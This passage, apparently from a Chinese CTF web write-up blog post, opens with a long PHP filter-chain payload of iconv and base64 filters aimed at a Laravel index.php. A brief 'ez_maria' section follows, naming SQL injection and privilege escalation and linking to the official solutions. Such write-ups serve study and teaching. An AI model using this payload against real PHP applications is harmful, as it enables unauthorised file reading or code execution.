convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/laravel/public/index.php&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h1 id="ez-maria"><a href="#ez-maria" class="headerlink" title="ez_maria"></a>ez_maria</h1><p>SQL注入加提权<br>敬请参考<br><a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2023/tree/main">https://github.com/Nu1LCTF/n1ctf-2023/tree/main</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/11/15/2023%20%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">2023 强网拟态 Web 赛后复现 Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">DASCTF X CBCTF 2023 Web 赛后复现 Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>